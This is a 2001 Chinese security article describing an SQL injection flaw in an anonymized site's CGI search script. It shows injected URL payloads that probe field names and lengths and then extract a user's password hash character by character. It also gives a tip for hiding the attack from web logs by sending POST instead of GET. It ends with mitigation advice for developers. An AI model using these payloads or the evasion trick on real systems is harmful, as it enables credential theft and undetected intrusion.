---
title: "关于我和刘思平发现的cgi漏洞"
date: 2001-08-30T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-257"
---

(inburst_at_263.net)

关于我和刘思平发现的xx（[www.xxxxxxx.com](http://www.xxxxxxx.com/)）的cgi漏洞


周星星 (zhouxx@hotmail.com)


(注意：出于对mark的尊重，我把一些信息用xx代替了。

在公布此文章的时候，xx的cgi漏洞可能已经修正，所以文章中的内容无法证实，

希望看的人主要看看原理，在自己的程序中多注意）


一 原理


    sqlhacking，我想大家都知道，就是web应用程序如果不对用户提交的数据做过滤

，

直接应用到sql语句中提交给后台数据库，这样很容易被不良用心的人利用，提交特殊

的

参数，构造sql语句，获得数据库中的敏感信息，包括：数据库用户的帐号、口令、安

全资料、

甚至于web维护人员的口令，或者提升权限，直接获得操作系统system权限（mssql).


   对于[www.xxxxxxx.com](http://www.xxxxxxx.com/)有多处存在此类问题，我找到一处比较有典型代表，如下链接

：


[http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345)

                                                           ^^^^^

这个链接是得到用户的资料，12345就是要查询的xx的ID，也就是数据库里的userid字

段 :)

如果我们提交这个链接，大家看看会有什么结果


[http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

password='1234'

                                                           

~~~~~~~~~~~~~~~~~~~~~~~~~ 

请看cgi程序use_show_info返回什么


“错误: Fail To Execute SQL: Unknown column 'password' in 'where clause' ”


这种调试信息本该只用到测试的时候显示给程序员调试用的，但目前清清楚楚显示给我

们.

cgi程序把我们提交的内容12345 and password='1234'全部加到sql语句中送给了mysql

操作，

当然出错了，因为操作的表里没有password这个字段。我猜想这条sql语句可能是这样

的：

select xxx,xxx,xxx,xxx from usertable where userid= %s

等加入我们提交的内容后，真正送给mysql的sql语句就变成：


select xxx,xxx,xxx,xxx from usertable where userid= 12345 and password='1234'

                                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^


看，当然会出错。但我们如何利用这点web应用程序的漏洞呢？


二 如何得到xx用户口令加密后的字段长度


   如果我们知道存放口令的字段名后，这条sql语句就决不会显示上面的出错信息，最

多显示

数据库找不到数据，和数据库出错等等（请注意：我们一定要思考为什么web应用程序

会给我

们这样不同的出错信息，在后面我们都要通过出错信息的不同来判断我们的操作是否正

确）

   到了此处我试了多个链接，如：

12345 and password='1234'

12345 and passwd='1234'

12345 and pass='1234'

12345 and PASS='1234'

.....

   都显示没有次字段名的错误，所以仍然没有猜到正确的口令数据库中的字段名。

但我绝对确信口令的字段一定同xx号字段（userid）在一个数据表(usertable)里，因为没

有人

会把用户id和口令passwd放到不同的表里，这些是需要经常检索的数据。

   在我无法继续的时候，刘思平给了我另外一个[www.xxxxxxx.com](http://www.xxxxxxx.com/)的很致命的cgi漏洞


这个漏洞是cgi居然没有执行就被直接下载到客户端，里面清清楚楚显示了数据库里的

众多重要的

信息，如数据表名，字段名，sql语句等等。通过这个问题，我找到了我感兴趣的东西

用户信息表名usertable,xx号码字段名userid, xx口令字段名passwordfield，这就足够了：）


好，现在我们提交这个链接：


[http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

passwordfield='1234'

                                                           

~~~~~~~~~~~~~~~~~~~~~~~~

真好，不再显示找不到字段名的出错信息，而是显示

“错误: 数据库错误 ”  这样的出错信息。

    “错误: 数据库错误 ” 这条信息我考虑可能是cgi在发现数据库没有检索到任何

数据后

显示的出错信息，当然也可能有其它原因，我们也无法知道这个cgi程序到底是如何工

作的。

但总可以知道，我们确实已经可以接触到passwordfield这个字段了。


那我们看看这个字段有多长，用如下几个链接


1) [http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

length(passwordfield)<32

                                                              

~~~~~~~~~~~~~~~~~~~~~~~~~~~ 

2) [http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

length(passwordfield)=32

                                                              

~~~~~~~~~~~~~~~~~~~~~~~~~~~

3) [http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

length(passwordfield)>32

                                                              

~~~~~~~~~~~~~~~~~~~~~~~~~~~

这3个链接1,3都返回“错误: 数据库错误 ” 错误信息，只有2返回了真正真确的12345

的用户资料，可见

只有2构造的sql语句返回了一条数据，其它都因为 and length(passwordfield) 的条件不为

真而没有返回数据。

所以可以确认字段passwordfield的长度是32位。

    这些都是我们根具我们的输入得到的结果而猜测cgi的工作流程，虽说是猜测，但

是有依据的。

    显然xx的口令再存放到数据库前已经经过加密。


三 如何得到xx口令passwordfield的加密串


    自然利用以上的链接就够用了。如下：


[http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

passwordfield>='f' （出错）

[http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

passwordfield>='e' （正确） 得到1位 e


[http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

passwordfield>='e2' （出错） 

[http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

passwordfield>='e1' （正确） 得到2位 e1


[http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

passwordfield>='e18' （出错） 

[http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

passwordfield>='e17' （正确） 得到3位 e17


[http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

passwordfield>='e178' （出错） 

[http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

passwordfield>='e177' （正确） 得到4位 e177


[http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

passwordfield>='e177b' （出错） 

[http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

passwordfield>='e177a' （正确） 得到5位 e177a


[http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

passwordfield>='e177a3' （出错） 

[http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

passwordfield>='e177a2' （正确） 得到6位 e177a2

.....

.....

.....

[http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

passwordfield>='e177a262d03c87a6e76' （出错）

[http://search.xxxxxxx.com/cgi-bin/search1?userid=12345](http://search.xxxxxxx.com/cgi-bin/search1?userid=12345) and 

passwordfield>='e177a262d03c87a6e75' （正确） 得到19位“e177a262d03c87a6e75”


    就这样最后把32位的字段内容都得到了。

    似乎有点累，我们可以写一个程序代我们测试。

    而且，还有个技巧：为了防止网管员检查weblog的时候看到这么多奇怪的输入，我

们可以将get的参数改成post参数，这样

weblog里面就会显示[http://search.xxxxxxx.com/cgi-bin/search1](http://search.xxxxxxx.com/cgi-bin/search1)

method post的记录，不会记录我们

提交的测试内容，这样他老人家也不会轻易发现 :)


四 尾声

   

   数据库mysql对于跨表的查询支持的不好，如果是oracle,db2,mssql等数据库就不用

如此费时，跨表查询直接得到申请密码保护

的数据内容就够了，我想不至于他们对这些内容也做了加密。


   写这篇文章主要是提醒web开发人员需要注意的一些安全问题，当然解决方法很简单

：

   （1）过滤应用程序中用户提交数据的特殊字符

   （2）数据库用户权限的管理和分配（如：读权限，读敏感表权限，写权限，写敏感

表权限等等）


-------------------------

[http://www.china9.net](http://www.china9.net/)

曾经温柔！
